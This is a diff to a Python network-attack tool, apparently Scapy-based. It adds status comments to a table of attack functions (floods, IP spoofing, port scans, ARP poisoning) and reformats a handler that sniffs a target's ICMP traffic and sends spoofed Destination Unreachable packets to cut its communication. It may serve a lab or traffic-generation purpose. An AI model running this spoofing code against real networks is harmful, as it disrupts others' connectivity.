@@ -10,15 +10,15 @@ def attack_to_perform(number):
         4: perform_dos,  # second dos attack
         5: perform_dos,  # third dos attack
         6: perform_ftp_attack,  # ftp attack
-        7: perform_sweep,  # ip address sweep
-        8: perform_port_scan,  # port scan
-        9: perform_ip_spoofing,  # ip spoofing
-        10: perform_os_discovery,  # os discovery
-        11: perform_syn_flood_attack,  # syn flood attack
-        12: perform_icmp_flood_attack,  # icmp flood attack
-        13: perform_udp_flood_attack,  # udp flood attack
-        14: perform_drop_communication,  # drop communication
-        15: perform_arp_poisoning,  # arp poisoning
+        7: perform_sweep,  # ip address sweep (ok)
+        8: perform_port_scan,  # port scan (ok)
+        9: perform_ip_spoofing,  # ip spoofing (ok)
+        10: perform_os_discovery,  # os discovery (ok)
+        11: perform_syn_flood_attack,  # syn flood attack (?)
+        12: perform_icmp_flood_attack,  # icmp flood attack (?)
+        13: perform_udp_flood_attack,  # udp flood attack (?)
+        14: perform_drop_communication,  # drop communication (not working)
+        15: perform_arp_poisoning,  # arp poisoning (to implement)
         16: perform_special_attack,  # special attack
     }
 
@@ -336,18 +336,28 @@ def perform_drop_communication(ip_addr=None):
 
     # Sniff packets and execute RST attack
     def packet_handler(packet):
-       if packet.haslayer(ICMP):
+        if packet.haslayer(ICMP):
             if packet[IP].src == ip_addr:
                 # Create an ICMP Destination Unreachable packet to drop the communication
                 drop_packet = ICMP(type=3, code=1)
 
                 # Send the ICMP Destination Unreachable packet
-                send(IP(src=packet[IP].src, dst=packet[IP].dst) / drop_packet, verbose=0)
-                send(IP(src=packet[IP].dst, dst=packet[IP].src) / drop_packet, verbose=0)
+                send(
+                    IP(src=packet[IP].src, dst=packet[IP].dst) / drop_packet, verbose=0
+                )
+                send(
+                    IP(src=packet[IP].dst, dst=packet[IP].src) / drop_packet, verbose=0
+                )
 
                 # Print the dropped communication
-                print("Dropped communication: Source IP: {}, Destination IP: {}, ICMP Type: {}, ICMP Code: {}".format(
-                    packet[IP].src, packet[IP].dst, packet[ICMP].type, packet[ICMP].code))
+                print(
+                    "Dropped communication: Source IP: {}, Destination IP: {}, ICMP Type: {}, ICMP Code: {}".format(
+                        packet[IP].src,
+                        packet[IP].dst,
+                        packet[ICMP].type,
+                        packet[ICMP].code,
+                    )
+                )
 
     # Start sniffing packets and call the packet_handler for each captured packet
     print("Start sniffing...")
